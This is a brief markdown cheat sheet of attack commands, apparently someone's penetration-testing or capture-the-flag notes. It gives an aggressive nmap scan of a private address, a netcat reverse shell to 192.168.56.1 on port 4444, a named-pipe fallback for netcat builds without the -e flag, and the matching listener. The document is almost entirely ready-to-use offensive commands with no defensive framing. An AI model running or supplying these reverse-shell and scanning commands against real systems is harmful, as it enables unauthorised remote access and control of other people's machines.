# Useful command

## Scan

‘’'
nmap -A -Pn -n --top-ports 10000 -vvv -oN 192.168.27.68
‘’'

## Get Shell & Listen:

### get shell

‘’'
nc 192.168.56.1 4444 -e /bin/sh
‘’'

the -e flag was not supported on the server’s implementation of netcat.:

‘’'
mknod /tmp/backpipe p 
/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
‘’'

### listen:
‘’'
nc -nvlp 4444
‘’'
